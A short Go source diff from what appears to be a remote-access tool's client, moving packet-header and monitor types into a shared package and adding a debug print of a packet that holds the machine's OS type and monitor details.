@@ -1,11 +1,12 @@
 package main
 
 import (
+	"fmt"
 	"rat/client/computer"
 	"rat/client/os"
 	"rat/client/screen"
-
-	"rat/client/network/header"
+	"rat/shared"
+	"rat/shared/network/header"
 )
 
 type ComputerInfoPacket struct {
@@ -15,7 +16,7 @@ type ComputerInfoPacket struct {
 		Type    string
 		Display string
 	} `os`
-	Monitors []screen.Monitor
+	Monitors []shared.Monitor
 }
 
 func (packet ComputerInfoPacket) Header() header.PacketHeader {
@@ -32,4 +33,6 @@ func (packet *ComputerInfoPacket) Init() {
 
 	screen.QueryMonitors()
 	packet.Monitors = screen.Monitors
+
+	fmt.Println(packet)
 }
